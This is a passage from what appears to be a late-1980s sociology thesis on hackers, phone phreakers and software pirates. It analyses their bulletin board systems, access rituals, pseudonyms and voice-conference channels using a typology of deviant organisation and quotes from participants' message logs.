                27                 Therefore, the hacker must experiment with commands and                 explore various files in order to understand and                 effectively use the system.  The goal here is to                 explore and experiment with the system that has been                 entered. By examining files and, perhaps, by a little                 clever programming, the hacker may be able to obtain                 protected information or more powerful access                 privileges.5                   Phreaking                      Another role in the computer underground is that                 of the  phone phreak.   Phone phreaking, usually called                 just  phreaking,  was widely publicized when the                 exploits of John  Cap'n Crunch  Draper, the  father of                 phreaking,  were publicized in a 1971 Esquire magazine                 article.                      The term  phreaking  encompasses several different                 means of circumventing  the billing mechanisms of                 telephone companies.  By using these methods, long                 ____________________                      5 Contrary to the image sometimes perpetuated by                computer security consultants, the data indicate that                hackers refrain from deliberately destroying data or                otherwise damaging the system.  Doing so would conflict                with their instrumental goal of blending in with the                average user so as not to attract undue attention to                their presence and cause the account to be deleted.                After spending what may be a substantial amount of time                obtaining a high access  account, the hacker places a                high priority on not being discovered using it.                                                                           28                 distance phone calls can be placed without cost. In                 many cases the methods also prevent, or at least                 inhibit, the possibility of calls being traced to their                 source thereby helping the phreaker to avoid being                 caught.                      Early phreaking methods involved electro                  mechanical devices that generated key tones, or altered                 line voltages in certain ways as to trick the                 mechanical switches of the phone company into                 connecting calls without charging.  However the advent                 of computerized telephone switching systems largely                 made these devices obsolete.  In order to continue                 their practice the phreaks have had to learn hacking                 skills 6                      Phreaking and hacking have just recently                     merged, because now, the telephone companies                     are using computers to operate their network.                     So, in order to learn more about these                     computers in relation to the network, phreaks                     have learned hacking skills, and can now                     program, and get around inside the machines                      AF, message log, 1988 .                      For most members of the computer underground,                 phreaking is simply a tool that allows them to call                 long distance without amassing enormous phone bills.                ____________________                      6 Because the two activities are so closely                related, with phreakers learning hacking skills and                hackers breaking into  telco  computers, reference is                usually made to phreak hacking or  p hackers.   This                paper follows this convention.                                                                           29                 Those who have a deeper and more technically oriented                 interest in the  telco   telephone company  are known                 as phreakers. They, like the hackers discussed earlier,                 desire to master and explore a system that few                 outsiders really understand                       The phone system is the most interesting,                     fascinating thing that I know of. There is so                     much to know. Even phreaks have their own                     areas of knowledge.  There is so much to know                     that  one phreak could know something fairly                     important and the next  phreak not.  The next                     phreak might know ten things that the  first                     phreak doesn't though. It all depends upon                     where and  how they get their info.  I myself                      sic  would like to work for the telco, doing                     something interesting, like programming a                     switch. Something that isn't slave labor                     bullshit. Something that you enjoy, but have                     to take risks in order to participate unless                     you are lucky enough to work for the telco.                     To have access to telco things, manuals, etc                     would be great  DP, message log, 1988 .                      Phreaking involves having the dedication to                     commit yourself to learning as much about the                     phone system network as possible. Since most                     of this information is not made public,                     phreaks have to resort to legally                     questionable means to obtain the knowledge                     they want  TP2, message log, 1988 .                        Most members of the underground do not approach                 the telephone system with such passion. Many hackers                 are interested in the phone system solely to the extent                 that they can exploit its weaknesses and pursue other                 goals.  In this case, phreaking becomes a means and not                 a pursuit unto itself. Another individual, one who                                                                          30                 identifies himself as a hacker, explains                       I know very little about phones . . . I just                     hack. See, I can't exactly call these numbers                     direct.  A lot of people are in the same                     boat.  In my case, phreaking is a tool, an                     often used one, but nonetheless a tool  TU,                     message log, 1988 .                       In the world of the computer underground, the                 ability to  phreak a call  is taken for granted.  The                 invention of the telephone credit card has opened the                 door to wide scale phreaking.  With these cards, no                 special knowledge or equipment is required to phreak a                 call, only valid credit card numbers, known as  codez,                  are needed to call any location in the world.  This                 easy access to free long distance service is                 instrumental for maintaining contact with CU                 participants scattered across the nation.                   Pirating                      The third major role in the computer underground                 is that of the software pirate.  Software piracy refers                 to the unauthorized copying and distribution of copy                  righted software.  This activity centers around                 computer bulletin board systems that specialize in                  warez. 7   There pirates can contribute and share                ____________________                      7  Warez  is a common underground term that refers                to pirated software.                                                                           31                 copies of commercial software. Having access to these                 systems  usually obtained by contributing a copyrighted                 program via a telephone modem  allows the pirate to                 copy, or  download,  between two to six programs that                 others have contributed.                      Software piracy is a growing concern among                 software publishing companies. Some contend that the                 illegal copying of software programs costs the industry                 billions of dollars in lost revenues. Pirates challenge                 this, and claim that in many ways pirating is a hobby,                 much like collecting stamps or baseball cards, and                 their participation actually induces them to spend more                 on software than they would otherwise, even to the                 point of buying software they don't truly need                       There's a certain sense of, ahh, satisfaction                     in having the latest program, or being the                     first to upload a program on the  want list.                      I just like to play around with them, see                     what they can do. If I like something, I'll                     buy it, or try out several programs like it,                     then buy one. In fact, if I wasn't pirating,                     I wouldn't buy any warez, because some of                     these I buy I do for uploading or just for                     the fun of it. So I figure the software                     companies are making money off me, and this                     is pretty much the same for all the really                     elite boards, the ones that have the best and                     most programs. . . . I just bought a  117.                     program, an accounting program, and I have                     absolutely no use for it. It's for small                     businesses.  I thought maybe it would auto                      write checks, but it's really a bit too high                     powered for me. I thought it would be fun to                     trade to some other boards, but I learned a                     lot from just looking at it  JX, field notes,                     1989 .                                                                          32                       Pirates and phreak hackers do not necessarily                 support the activities of each other, and there is                 distrust and misunderstanding between the two groups.                 At least part of this distrust lies in the                 phreak hacker perception that piracy is an unskilled                 activity.8  While p hackers probably don't disapprove                 of piracy as an activity, they nevertheless tend to                 avoid pirate bulletin board systems   partly because                 there is little pertinent phreak hack information                 contained on them, and partly because of the belief                 that pirates indiscriminately abuse the telephone                 network in pursuit of the latest computer game.  One                 hacker illustrates this belief by theorizing that                 pirates are responsible for a large part of telephone                 credit card fraud.                      The media claims that it is solely hackers                     who are responsible for losses pertaining to                     large telecommunication companies and long                     distance services.  This is not the case.  We                     are  hackers  but a small portion of these                     losses.  The rest are caused by pirates and                     thieves who sell these codes to people on the                     street  AF, message log, 1988 .                      Other hackers complained that uploading large                ____________________                      8 A possible exception to this are those pirates                that have the programming skills needed to remove copy                protection from software.  By removing the program code                that inhibits duplicate copies from being made these                individuals, known as  crackers,  contribute greatly to                the easy distribution of  warez.                                                                            33                 programs frequently takes several hours to complete,                 and it is pirate calls, not the ones placed by  tele                  communications enthusiasts   a popular euphemism for                 phreakers and hackers  that cost the telephone industry                 large sums of money. However, the data do not support                 the assertation that all pirates phreak their calls.                 Phreaking is considered  very tacky  among elite                 pirates, and system operators  Sysops  of pirate                 bulletin boards discourage phreaked calls because it                 draws attention to the system when the call is                 discovered by the telephone company.                      Regardless of whether it is the lack of phreak                  hack skills, the reputation for abusing the network, or                 some other reason, there is indeed a certain amount of                 division between the world of phreakers and hackers and                 that of pirates. The two communities co exist and share                 resources and methods, but function separately.                                                                            34                          Social Organization and Deviant Associations                      Having outlined and defined the activities of the                 computer underground, the question of social                 organization can be addressed.  Joel Best and David                 Luckenbill  1982  have developed a typology for                 identifying the social organization of deviant                 associations.  Essentially they state that deviant                 organizations, regardless of their actual type of                 deviance, will vary in the complexity of their division                 of labor, coordination among organization roles, and                 the purposiveness with which they attempt to achieve                 their goals.  Those organizations which display high                 levels in each of these categories are more                 sophisticated than those with lower levels.                      Deviants relations with one another can be                     arrayed along the dimension of organizational                     sophistication. Beginning with the least                     sophisticated form,  we  discuss five forms                     of the social organization of deviants                      loners, colleagues, peers, mobs, and formal                     organizations.  These organization forms are                     defined in terms of four variables  whether                     the deviants associate with one another                      whether they participate in deviance                     together  whether their deviance requires an                     elaborate division of labor  and whether                     their organization's activities extend over                     time and space  Best and Luckenbill, 1982,                     p.24 .                 These four variables, also known as mutual association,                 mutual participation, elaborate division of labor, and                                                                          35                 extended organization, are indicators of the social                 organization of deviant groups. The following, taken                 from Best and Luckenbill, illustrates                  FORM OF       MUTUAL    MUTUAL      DIVISION  EXTENDED                ORGAN         ASSOCIA   PARTICIPA   OF        ORGAN                 IZATION       TION      TION        LABOR     IZATION                                                                                     Loners         no        no          no        no                Colleagues     yes       no          no        no                Peers          yes       yes         no        no                Mobs           yes       yes         yes       no                Formal                Organizations  yes       yes         yes       yes                _____________________________________________________                                                         1982, p.25                        Loners do not associate with other deviants,                     participate in shared deviance, have a                     division of labor, or maintain their deviance                     over extended time and space.  Colleagues                     differ from loners because they associate                     with fellow deviants. Peers not only                     associate with one another, but also                     participate in deviance together.  In mobs,                     this shared participation requires an                     elaborate division of labor.  Finally, formal                     organizations involve mutual association,                     mutual participation, an elaborate division                     of labor, and deviant activities extended                     over time and space  Best and Luckenbill,                     1982, pp.24 25 .                      The five forms of organizations are presented as                 ideal types, and  organizational sophistication  should                 be regarded as forming a continuum with groups located                 at various points along the range  Best and Luckenbill,                 1982, p.25 .  With these two caveats in mind, we begin                 to examine the computer underground in terms of each of                                                                          36                 the four organizational variables. The first level,                 mutual association, is addressed in the following                 section.                                                                            37                                       Mutual Association                      Mutual association is an indicator of                 organizational sophistication in deviant associations.                 Its presence in the computer underground indicates that                 on a social organization level phreak hackers act as                  colleagues.   Best and Luckenbill discuss the                 advantages of mutual association for unconventional                 groups                       The more sophisticated the form of                     organization, the more likely the deviants                     can help one another with their problems.                     Deviants help one another in many ways  by                     teaching each other deviant skills and a                     deviant ideology  by working together to                     carry out complicated tasks  by giving each                     other sociable contacts and moral support  by                     supplying one another with deviant equipment                      by protecting each other from the                     authorities  and so forth.  Just as   others                      rely on one another in the course of everyday                     life, deviants find it easier to cope with                     practical problems when they have the help of                     deviant associates  1982,pp.27 28 .                       Hackers, phreakers, and pirates face practical                 problems. For example, in order to pursue their                 activities they require  equipment9 and knowledge.  The                ____________________                      9 The basic equipment consists of a modem, phone                line, and a computer    all items that are available                through legitimate channels.  It is the way the                equipment is used, and the associated knowledge that is                required, that distinguishes hackers from other                computer users.                                                                           38                 problem of acquiring the latter must be solved and,                 additionally, they must devise ways to prevent                 discovery , apprehension and sanctioning by social                 control agents.10                      One method of solving these problems is to turn to                 other CU members for help and support.  Various means                 of communication have been established that allow                 individuals to interact regardless of their location.                 As might be expected, the communication channels used                 by the CU reflect their interest and ability in high                  technology, but the technical aspects of these methods                 should not overshadow the mutual association that they                 support.  This section examines the structure  of                 mutual association within the computer underground.                              ____________________                        10 Telephone company security personnel, local law                enforcement, FBI, and Secret Service agents have all                been involved in apprehending hackers.                                                                           39                            The Structure of the Computer Underground                      Both computer underground communities, the                 p hackers and the pirates, depend on communications                 technology to provide meeting places for social and                  occupational  exchanges.  However, phreakers, hackers,                 and pirates are widely dispersed across the country                 and, in many cases, the globe.  In order for the                 communication to be organized and available to                 participants in many time zones and  working  under                 different schedules, centralized points of information                 distribution are required.  Several existing                 technologies   computer bulletin boards, voice mail                 boxes,  chat  lines, and telephone bridges loops                    have been adopted by the CU for use as communication                 points. Each of these technologies will be addressed in                 turn, giving cultural insight into CU activities, and                 illustrating mutual association among CU participants.                   Bulletin Board Systems                      Communication in the computer underground takes                 place largely at night, and primarily through Bulletin                 Board Systems  BBS .  By calling these systems and                  logging on  with an account and password individuals                 can leave messages to each other, download files and                                                                          40                 programs, and, depending on the number of phone lines                 into the system, type messages to other users that may                 be logged on at the same time.                      Computer Bulletin Board Systems, or  boards,   are                 quite common in this computerized age.  Nearly every                 medium sized city or town has at least one. But not all                 BBS are part of the computer underground culture.  In                 fact, many systems prohibit users from discussing CU                 related activity.  However, since all bulletin boards                 systems essentially function alike it is only the                 content, users, and CU culture that distinguish an                  underground  from a  legitimate  bulletin board.                      Computer Underground BBS are generally owned and                 operated by a single person  known as the  system                 operator  or  sysop  . Typically setup in a spare                 bedroom, the costs of running the system are paid by                 the sysop, though some boards solicit donations from                 users. The sysop maintains the board and allocates                 accounts to people who call the system.                      It is difficult to assess the number of                 underground bulletin boards in operation at any one                 time. BBS in general are transitory in nature, and CU                 boards are no exception to this. Since they are                 operated by private individuals, they are often set up                 and closed down at the whim of the operator. A week                                                                          41                 that sees two new boards come online may also see                 another close down.  A  lifetime  of anywhere from 1                 month to 1 1 2 years is common for pirate and                 phreak hack boards.11   One BBS, claimed to be the                  busiest phreak hack board in the country  at the                 time,12 operated for less than one year and was                 suddenly closed when the operator was laid off work.                      Further compounding the difficulty of estimating                 the number of CU boards is their  underground  status.                 CU systems do not typically publicize their existence.                 However, once access to one has been achieved, it is                 easy to learn of other systems by asking users for the                 phone numbers.  Additionally, most BBS maintain lists                 of other boards that users can download or read. So it                 is possible, despite the difficulties, to get a feel                 for the number of CU boards in operation.    Pirate                 boards are the most common of  underground  BBS.  While                 there is no national  directory  of pirate boards,                 there are several listings of numbers for specific                ____________________                      11 While some non CU BBS' have been operating                since 1981, the longest operating phreak hack board has                only been in operation since 1984.                       12 At it's peak this p h board was receiving 1000                calls a month and supported a community of 167 users                 TP BBS, message log, 1989 .                                                                           42                 computer brands.13  One list of Apple pirate boards has                 700 entries. Another, for IBM boards, lists just over                 500.  While there is no way of determining if these                 lists are comprehensive, they provide a minimum                 estimate. Pirate boards for systems other than IBM or                 Apple seem to exhibit similar numbers. David Small, a                 software developer that has taken an aggressive stance                 in closing down pirate boards, estimates that there are                 two thousand in existence at any one time  1988 .                 Based on the boards discovered in the course of this                 research, and working from an assumption that each of                 the four major brands of microcomputers have equal                 numbers of pirate boards, two thousand is a reasonable                 estimate.                      The phreak hack BBS community is not divided by                 differing brands of micro computers.  The applicability                 of phreak hack information to a wide range of systems                 does not require the specialization that pirate boards                 exhibit.  This makes it easier to estimate the number                 of systems in this category.                      John Maxfield, a computer security consultant, has                 asserted that there are  thousands  of phreak hack                ____________________                      13 Pirate boards are normally  system specific  in                that they only support one brand or model of                microcomputer.                                                                           43                 boards in existence  WGN Radio, November 1988 .  The                 data, however, do not confirm this.  A list of                 phreak hack boards compiled by asking active p hackers                 and downloading BBS lists from known phreak hack                 boards, indicates that there are probably no more than                 one hundred.  Experienced phreak hackers say that the                 quality of these boards varies greatly, and of those                 that are in operation today only a few  less than ten                  attract the active and knowledgeable user.                      Right after  War Games  came out there must                     have been hundreds of hacker bulletin boards                     spring up. But 99  of those were lame. Just a                     bunch of dumb kids that saw the movie and                     spent all there  sic  time asking  anyone got                     any k00l numberz   instead of actually                     hacking on anything. But for a while there                     was  sic  maybe ten systems worth calling . .                     . where you could actually learn something                     and talk to people who knew what was going                     Nowadays  sic  there are maybe three that I                     consider good . . . and about four or five                     others that are okay.  The problem is that                     anybody can set up a board with a k rad name                     and call it a hacker board and the media feds                     will consider it one if it gets busted. But                     it never really was worth a shit from the                     beginning. TP2, field notes, 1989                        Towards a BBS Culture.  Defining and identifying                 CU boards can be problematic.  The lack of an ideal                 type undoubtedly contributes to the varying estimates                 of the number of CU bulletin board systems. While                 developing such a typology is not the intent of this                 work, it is appropriate to examine the activities and                                                                          44                 characteristics exhibited by BBS supporting the pirate                 and phreak hack communities.  While much of the culture                 of pirate and phreak hack worlds overlap, there are                 some differences in terms of how the BBS medium is used                 to serve their interests. We begin with a short                 discussion of the differences between the two                 communities, then discuss cultural characteristics                 common to all CU BBS systems.                      All BBS feature a  files area  where programs and                 text files are available for downloading by users.                 Initially these programs files are supplied by the                 system operator, but as the board grows they are                 contributed  called  uploading   by callers. The                 content and size of the files area differs according to                 whether the board supports the pirate or phreak hack                 community.                      The files area on a pirate board consists                 primarily of programs and program documentation.                 Normally these programs are for only one brand of                 micro computer  usually the same as the system is being                 run on . Text files on general or non computer topics                 are uncommon.  A  files area  menu from a pirate BBS                 illustrates the emphasis on software                        1  Documentation         2  Telecommunications                      3  Misc Applications     4  Word Processing                      5  Graphics              6  Utilities                      7  Games 1               8  Games 2                                                                          45                       9  XXX Rated             10  Elite_1                      11  Elite_2              12  Super_Elite                                        IN BBS, message log, 1988                       The  files area  on a phreak hack BBS is                 noticeably smaller than it is on pirate systems.  It                 consists primarily of instructional files  known as  g                  files  for  general files   and copies of phreak hack                 newsletters and journals.  Pirated commercial software                 is very rare  any programs that are available are                 usually non copyrighted specialized programs used to                 automate the more mundane aspects of phreaking or                 hacking. It is not uncommon to find them in forms                 usable by different brands of computers.

The                 main commodity of exchange between pirates is, as                 discussed earlier, copyrighted software thus accounting                 for the heavy use of that area of the board that                 permits exchange of programs.  The phreak hackers, on                 the other hand, primarily exchange information about                 outside systems and techniques.  Their interests are                 better served by the  message bases  of BBS.                      The  message bases   areas where callers leave                 messages to other users  are heavily used on                 phreak hack systems. The  messages are not specific to                 one brand of micro computer due to the fact that not                 all users own the same equipment. Rather than focus on                 the equipment owned by the phreak hacker, the messages                 deal with their  targets.   Everything from                 phreak hacking techniques to CU gossip is discussed. On                                                                          47                 some boards all the messages, regardless of topic, are                 strung together in one area.  But on others there are                 separate areas dealing with specific networks and                 mainframe computers                       Message Boards available                        1   General                      2   Telecommunications                      3   Electronics                      4   Packet Switched Nets                      5   VAX DEC                      6   Unix                      7   Primos                      8   HP x000                      9   Engineering                     10   Programming   Theory                     11   Phrack Inc.                     12   Sociological Inquiries                     13   Security Personnel   Discussion                     14   Upper Deck                     15   Instructors                                         TPP BBS, message log, 1988                        The pirate community, on the other hand, makes                 little use of the  message bases.  Most users prefer to                 spend their time  which may be limited by the system                 operator on a per day or per call basis  uploading                 and or downloading files rather than leaving messages                 for others.  Those messages that do exist are usually                 specific to the pirating enterprise such as help with                 programs on the board, requests for specific programs                   want lists  , and notices about other pirate bulletin                 boards that users may want to call. Occasional                 discussion of phreaking may occur, but the emphasis is                                                                          48                 on techniques used to make free calls, not technical                 network discussions as often occurs on phreak hack                 systems.  A list of message areas from a large pirate                 BBS illustrates the emphasis on the pirating                 enterprise.  A message area for general discussions has                 been created, but those areas devoted to pirating                 display more use                       Area  1  General Discussion      15 messages                     Area  2  Pirating Only!!         75 messages                     Area  3  Warez Wants             31 messages                     Area  4    private messages      10 messages                                       TL BBS, message log, 1988                        In addition to the differences between files and                 message use on pirate and phreak hack boards, they                 differ in degree of community cohesiveness.  Every BBS                 has a group of  users    the people who have accounts                 on the system. The group of users that call a specific                 BBS can be considered to be a  community  of loosely                 associated individuals by virtue of their  membership                  in the BBS.                      Additionally, the system itself, serving either                 pirates or phreak hackers, exists within a loose                 network of other bulletin boards that serve these same                 interests. It is within this larger community where                 pirate and phreak hack boards seem to differ.                      Due to the brand specific nature of pirate boards,                 there is not a strong network between pirate BBS that                                                                          49                 operate on other systems.  This is understandable as a                 pirate that owned an Apple computer would have little                 use for the programs found on an IBM board.  However,                 this creates separate communities of active pirates,                 each loosely associated with other users of their                 computer type, but with little or no contact with                 pirate communities on other systems.                      There is, however, a degree of cohesiveness among                 pirate boards that support the same micro computers.                 While the users may be different on systems, the data                 shows that some pirate boards are  networked  with each                 other via special software that allows messages and                 files to be automatically shared between different                 boards.  Thus a message posted on a west coast pirate                 board will be automatically copied on an east coast BBS                 later that night. In a like manner, software programs                 can be sent between  networked  boards.  The extent of                 this network is unknown.                      The pirate BBS community also exhibits                 cohesiveness in the form of  co sysops.   As discussed                 earlier, sysops are the system operators and usually                 owners of BBS.  On some pirate boards,  co sysop                  distinction is given to an operator of another board,                 often located in another state. This forms a loose                 network of  sister boards  where the sysop of one has                                                                          50                 co sysop privileges on the other.   However, this                 cooperative effort appears to be limited mainly to the                 system operators as comparing user lists from sister                 boards shows little overlap between the regular                 callers. How co sysop positions are utilized is                 unknown, and it is suspected that they are largely                 honorary.  But nonetheless it is indicative of mutual                 association between a small number of boards.                       The phreak hack board community does not exhibit                 the same brand specific division as the pirate                 community.  Unlike the divided community of pirates,                 phreak hackers appear to maintain contacts throughout                 the country.  Obtaining and comparing user lists from                 several phreak hack BBS reveals largely the same group                 of people using several different boards across the                 country.14 While phreak hack boards have yet to adopt                 the  networking  software used by pirate boards, an                 active group of phreak hackers is known to use the                 sophisticated university mainframe computer network,                 called Bitnet, to exchange phreak hack newsletters and                 gossip.                      Despite the operational differences between pirate                ____________________                      14 In fact, users lists from phreak hack BBSs                located in Europe and Australia show that many U.S.                p hackers utilize these systems as well.                                                                           51                 and phreak hack boards, their cultures are remarkably                 similar. Any discussion of the computer underground                 must include both communities.  Additionally, a                 formulation of the culture of CU BBS must address the                 means in which access to the board, and thus deviant                 associates, is obtained.                      For a caller to successfully enter the CU BBS                 community, he must display an awareness of CU culture                 and technical skill in the CU enterprise. If the caller                 fails to exhibit cultural knowledge, then access to the                 board is unlikely to be granted.  The ways in which                 this cultural knowledge is obtained and displayed                 illustrates the social nature of the CU and further                 displays some of the subcultural norms of behavior.                      On most  licit   non underground  boards,                 obtaining permission to use the system is accomplished                 by logging on and providing a name and home phone                 number to the system operator  sysop .  Sysop's                 normally do not check the validity of the information,                 and once a caller has provided it he or she is granted                 full access to the system.  There is normally one level                 of access for all users, with only the sysop having                 more  powerful  access.                      Obtaining access to underground bulletin boards is                 more complicated and requires more steps to complete.                                                                          52                 In an attempt to prevent law enforcement agents                   feds   from obtaining accounts on systems where                 pirates or p hackers are vulnerable, if not to actual                 arrest, then at least to exposing their latest act                  ivities and methods, sysop's of illicit boards attempt                 to limit access to the system.                      One method of doing this is to restrict                 publicizing the existence of the board.  Computer                 underground BBS are not normally included in BBS                 listings found in computer books and magazines, and                 there is a norm, particularly strong on p hack systems,                 that the boards are not to be mentioned on non CU                 systems.  There are, however, some  entry level  CU BBS                 that are fairly well known.  These systems are known as                  anarchist  boards.                       Anarchist  boards, while exhibiting many of the                 same characteristics as pirate and phreak hack boards,                 are really a cross between the two and serve primarily                 as social outlets for both pirates and phreak hackers.                 The message areas on  anarchist  boards are quite                 active,  chatty  messages are not discouraged. Indeed                 there are normally  several different message areas                 devoted to a wide range of topics including everything                 from  skipping school  to  punk rock.  The files area                 contains both warez  but normally only the newest                                                                          53                 games, and specific to the computer system that the                 board runs on  and phreak hack text files.  Neither                 collection is as extensive as it would be on pirate                  only or p hack only systems.                      The data suggest that one function of  anarchist                  boards is to introduce newcomers to the culture of the                 computer underground. By acting as  feeder boards,                  they can provide preliminary socialization and                 instruction for CU behavior and techniques.                 Additionally,  anarchist  boards frequently provide                 areas where phone numbers to pirate and p hack systems                 can be traded, thus providing systems where more in                  depth information, and other contacts, can be found.  A                 phreak hacker describes how an  anarchist  board was                 instrumental in introducing him to the computer                 underground                       I've been phreaking and hacking for about                     four years now.  I discovered phreaking on my                     own at this place I used to work.  We had                     this small LD  long distance  provider that                     used codez so I started hacking them out and                     calling places myself . . . but I didn't know                     no other phreaks at that time.  Then I                     started using the codez to call boards from                     home on my computer. Somebody gave me the                     number to Jack Black's Whore House  an                      anarchy board   and I started learning about                     hacking and shit from the people and philes                     they had there. Then one day this guy, King                     Hammer, sent me some e mail  a private                     message  and told me to call his system.                     That's where I really learned my way around                     the nets and shit.  You could ask questions                     and people would help you out and stuff. If I                                                                          54                      hadn't found out some of the tricks that I                     did I probably would have got busted by now.                      TP2, field notes, 1989                       Once an individual has obtained the telephone                 number to a CU BBS, through whatever channels, callers                 follow essentially the same procedure as they do on                 licit systems . . . that of calling and logging on.                 However, since  underground  boards are not truly                 underground  that is, totally secret  first time                 callers are not given access to the board itself. When                 a user is unable to provide an already valid                 username password, the system will automatically begin                 its registration procedure.   First, the caller is                 asked to enter a  username   the name used by the                 system to distinguish between callers  and  phone                 number.   These first system requests, normally seen                 only as  Enter Your Name and Phone Number,  serve as                 partial screens to keep out non underground callers                 that may have happened across the board.  The way that                 a user responds to these questions indicates if they                 have cultural knowledge of the CU. The  norm is to                 enter a pseudonym and a fake phone number.15 If a                ____________________                      15 A functional reason for this norm is that                usernames and telephone numbers are stored on the                computer as part of the BBS system files.  Should the                BBS ever be seized in legal proceedings, this list of                names and numbers  and on some systems addresses . . .                which are also normally false  could be used to                identify the users of the system.                                                                           55                 caller enters his or her real name  or at least a name                 that does not appear to be a pseudonym  the system                 operator will be put on guard that the caller may not                 be aware of the type of board that he has called, for                 the pseudonym is the most visible of CU cultural                 traits.                      All members of the underground adopt  handles  to                 protect their identity.  The pseudonyms become second                 identities and are used to log onto bulletin boards,                 and as   signatures  on messages and instructional text                 files.16  They are not unlike those adopted by                 citizens band radio users, and reflect both the humor                 and technical orientation of computer underground                 participants.  A review of handles used by phreakers,                 hackers, and pirates finds that they fall into three                 broad categories  figures from literature, films, and                 entertainment  often science fiction   names that play                 upon computers and related technologies  and                 nouns descriptive names.   See Appendix A for fictional                 examples of each.                       After providing a user name and entering a                 ____________________                        16 The data suggest that, on the whole,                individuals retain their handles over time.                                                                           56                 password to be used for future calls, the caller is                 asked several more questions designed to screen users                 and determine initial access privileges.  Unlike licit                 boards, underground BBS may have several different                 levels of access with only the most trusted users being                 able to read messages and get files in  elite  or  high                 access  areas that are unknown and unavailable to other                 callers.  In many cases, pirate boards are able to                 operate  above ground   and appear to be open public                 access systems unless callers have the proper                 privileges to access the areas where the  good stuff                  is located.  The answers given to access questionnaires                 determine whether a caller will receive access to some,                 all, or none of the higher levels.                      These questionnaires frequently ask for  personal                 references  and a list of other boards the caller has                  high access  on.  The question is vague, and random                 callers are unlikely to answer it correctly.  However,                 if the caller lists pseudonyms of other CU members that                 are known and trustworthy to the sysop, as well as some                 other boards that are known to have  good users  and                  good security  access will usually be granted.17  If                 all the answers are relevant and indicative of CU                ____________________                      17 The data suggest that personal references are                only checked if something seems unusual or suspicious.                                                                           57                 knowledge, then initial access is normally granted.                      Other methods of controlling access include                 presenting a  quiz  to determine if the technical                 knowledge of the user is up to par with the expertise                 expected on the boards.18  Some systems, instead of a                 quiz, ask the user to write a short statement  100                 words or less  about why they want access, where they                 got the phone number to the system, and what they can                 provide to other users. Some pirate boards come right                 out and ask the user to supply a list of the good                  warez  that they can upload and what they are looking                 to download. If the caller fails to list recent                 copyrighted programs then it is evident that they are                 unaware of the nature of the BBS                       I had this one dude call up and he told me in                     his message that he was looking for some                      good games.   So instead of giving him                     access I just left him some e mail  a private                     message .  I asked what kind of games he was                     looking for. Next time he called he wrote                     back and said  a public domain Asteroids                     game.   I couldn't believe it. Not only is                     Asteroids so damn old it's lame, but this guy                     is looking for pd  public domain  shit.  No                     way was he going to get access. He didn't                     even know what this board is. I left him a                     message telling him that I didn't have one.                     He never called back after that  CH, sysop of                     a pirate BBS, field notes, 1988 .                 ____________________                      18 One such quiz, from a p h board, can be found                in Appendix B.                                                                           58                      Ironically, the pseudo elaborate security methods                 of underground boards, while they may be effective in                 keeping off random non CU callers, are not effective in                 screening out  feds.  Data and media accounts show that                 boards are regularly infiltrated by telephone security                 personnel and software companies. Also, the adoption of                 handles to protect identities is defeated by the                 consistent use of the same handle over time. But in                 order to obtain and maintain status and prestige in the                 CU one must keep the same pseudonym in order to                  literally   make a name for oneself.  The fact that CU                 communication is not face to face requires a consistent                 means of identifying oneself to others.  The handle                 fulfills this purpose but at the same time becomes as                 attached to a single individual as a real name would.                 The access rituals of the computer underground, which                 are contingent on being a  known  pirate or                 phreak hacker, make changing handles unproductive.                      The life blood and center of the computer under                  ground is the bulletin board network.  Acting as both                 the main trade center of performance related tools and                 innovations and as a means of socialization, the                 underground could not exist without the BBS network.                 They serve to  recruit  and educate newcomers and                 provide a way to traffic in information and software.                                                                          59                 The pirating enterprise in particular is very dependent                 upon the BBS as they are the very means by which                  warez  are traded.  For the phreak hacker community,                 BBS provide a means of trading the resources of system                 numbers and passwords, as well as instructional texts                 on techniques.  The access process serves as evidence                 of mutual association amongst phreakers, hackers, and                 pirates as cultural knowledge is needed as well as                 personal references  evidence of acceptance and access                 to others .                      The CU bulletin board systems are unique in that                 they provide a way to exchange information with a large                 number of others.  The other methods of CU commun                  ication are based on conversations rather than written                 texts and thus are much less permanent.  These methods,                 discussed next, are telephone bridges loops, voice mail                 boxes, and computer  chat  systems.                   Bridges, Loops, and Voice Mail Boxes                      Of the additional means of communication used by                 the CU, telephone  bridges  and  loops  are most                 common.  Unlike BBS, which require data links provided                 by a computer and modem, bridges and loops are  old                 fashioned  voice connections.  Since they can not                 accommodate the transfer of programs or files they are                 used primarily by phreakers and hackers, and most often                                                                          60                 as a social recreational outlet.                      A  bridge  is a technical name for what is                 commonly known as a  chat line  or  conference system.                  They are familiar to the  public as the pay                  per minute group conversation systems advertised on                 late night television.  Many bridge systems are owned                 by large corporations who maintain them for business                 use during the day.  While the numbers to these systems                 is not public knowledge, many of them have been                 discovered by phreaks who then utilize the systems                 during the night.                      In addition to these pre existing conference                 systems, phreakers have become skilled at  arranging                 for a temporary, private bridge to be created via                 AT T's conference calling facilities.  This allows for                 conversations to be held among a self selected group of                 phreak hackers 19                      Bridges can be  sic  extremely useful means                     of distributing information as long as the                      phone  number is not known, and you don't                     have a bunch of children online testing out                ____________________                      19 The data indicates that these private                conference calls aren't  scheduled  in any real sense.                One p hacker will initiate the conference and call                others at home to add them to the conference.  As more                people join they suggest others to add. The initiator                can temporarily jump out of the conference, call the                new person and solicit their attendance. If they don't                want to join or aren't home, the initiator simply                returns to the conference without adding them in.                                                                           61                      their DTMF.20  The last great discussion I                     participated with over a bridge occurred                     about 2 months ago on an AT T Quorum where                     all we did was engineer 3 way  calls  and                     restrict ourselves to purely technical infor                      mation. We could have convinced the Quorum                     operators that we were AT T technicians had                     the need occurred. Don't let the kids ruin                     all the fun and convenience of bridges.                     Lameness is one thing, practicality is                     another  DC, message log, 1988 .                       In addition to setting up  private  bridges,                 p hackers can utilize  loop lines  in a further attempt                 to limit the number of eavesdroppers on their                 conversations. Unlike bridges, which connect a                 virtually unlimited number of callers at once,  loops                  are limited to just two people at a time.                       Loop lines  are actually telephone company test                 lines installed for internal use.21  A loop consists of                 two separate telephone numbers that connect only to                 each other. Each end has a separate phone number, and                 when each person calls one end, they are connected to                 each other automatically.  This allows for individuals                ____________________                      20  Dual Tone Multi Frequency  or in laymen terms,                the touch tone sounds used to dial phone numbers.                       21 These test lines are discovered by phreaks and                hackers by programming their home computer to dial                numbers at random and  listen  for the distinctive tone                that an answering loop makes, by asking sympathetic                telephone company employees, or through information                contained on internal company computers.                                                                           62                 to hold private conversations without divulging their                 location or identity by exchanging telephone numbers.                      Finally, voice mail boxes   VMB   are another                 means of communicating with individual actors. There                 are several commercial voice mail box systems located                 throughout the country.  They function similar to a                 telephone answering machine in that callers can call                 in, listen to a recorded message, and then leave a                 message for the box owner. Many of these systems are                 accessible via toll free telephone 